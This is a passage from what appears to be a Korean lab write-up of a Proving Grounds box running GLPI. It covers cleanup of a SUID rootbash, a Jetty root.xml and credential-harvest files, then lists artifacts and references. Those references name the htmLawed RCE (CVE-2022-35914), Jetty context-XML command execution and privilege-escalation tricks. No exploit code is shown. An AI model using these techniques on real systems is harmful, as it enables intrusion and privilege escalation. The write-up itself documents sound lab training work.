- 타겟: `/opt/jetty/jetty-base/webapps/root.xml` 삭제(자동 언디플로이), `/tmp/rootbash` 삭제, `/tmp/.g.sql`·harvest 임시파일(`/tmp/.h`·`/tmp/.h.sh`·`/tmp/.hv.txt`) 삭제. 만든 계정·바꾼 설정 없음
  ⚠️ 이 정리는 betty SSH 세션에서 눈으로 확인한 것이고 파일로 안 찍어둠 — `/tmp/rootbash` 없음, `/opt/jetty/jetty-base/webapps/` 비어 있음까지 봤으나 그 화면의 산출물 근거는 없음 [관측 없음]. 박스가 정지돼 다시 찍을 수도 없음. 다음부터는 정리 직후 `ls -la` 출력을 파일로 떨어뜨릴 것
- Kali: 앞선 시도가 남긴 nc:443 리스너·john 프로세스·좀비 watcher 를 PID 특정해 종료, tmux 세션 `glpibetty`/`glpinmap`/`glpish` 를 이름으로 종료(tmux 서버 비었음)
- 리버스셸은 미시도 — betty SSH 로 정식 대화형 셸이 열려 웹 RCE 를 승격할 이유가 없었음. 이 박스의 아웃바운드 egress 제약 여부는 **확인하지 않았음** [관측 없음]
- 산출물: `~/PG/GLPI/` 52개 (proof_user.txt·proof_root.txt·rce.sh·root.xml·ticket_dump.txt·harvest_betty.txt·disable_functions.txt·실패 응답 HTML 포함)
- 스크린샷은 2종뿐 — GLPI 로그인 화면과 htmLawed 테스트 페이지. Kali 의 `shot_rce_success.png` 는 `shot_htmlawed.png` 의 사본이었고, 볼트로 옮길 때 같은 두 이미지가 네 이름으로 늘어나 있었음. 오도하는 사본 두 개(`PG-GLPI-glpi-login.png`·`PG-GLPI-htmlawed-rce.png`)는 `03. PG\_backup\` 으로 이동

## 관련

- CVE-2022-35914 — GLPI htmLawed `htmLawedTest.php` 무인증 RCE (GLPI ≤ 10.0.2, CVSS 3.1 = 9.8). 벤더 공지 「Important message about security (CVE-2022-35947, CVE-2022-35914)」 — 10.0.3 · 9.5.9 에서 수정: <https://www.glpi-project.org/en/security-update-10-0-3-and-9-5-9/>
- Jetty context XML deploy → RCE: `Configure` + `java.lang.Runtime.exec`
- 이 박스의 시행착오·기법 카드 — [[_PLAYBOOK#A-22. 비번 해시를 못 깬다 (bcrypt 등)]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#B-13. disable_functions 우회 (PHP)]] · [[_PLAYBOOK#B-18. 번들 서드파티 컴포넌트가 진짜 취약점이다]] · [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]] · [[_PLAYBOOK#B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승]] · [[_PLAYBOOK#B-62. 자격증명은 인증 DB 가 아니라 «애플리케이션 데이터» 에 있다]]
- 관련 패턴: "버전 판정은 독립 근거 2개" — [[Hub]] · [[Levram]]. "저장소 이원화 / 인증 DB ≠ 앱 데이터" — [[Wheels]]
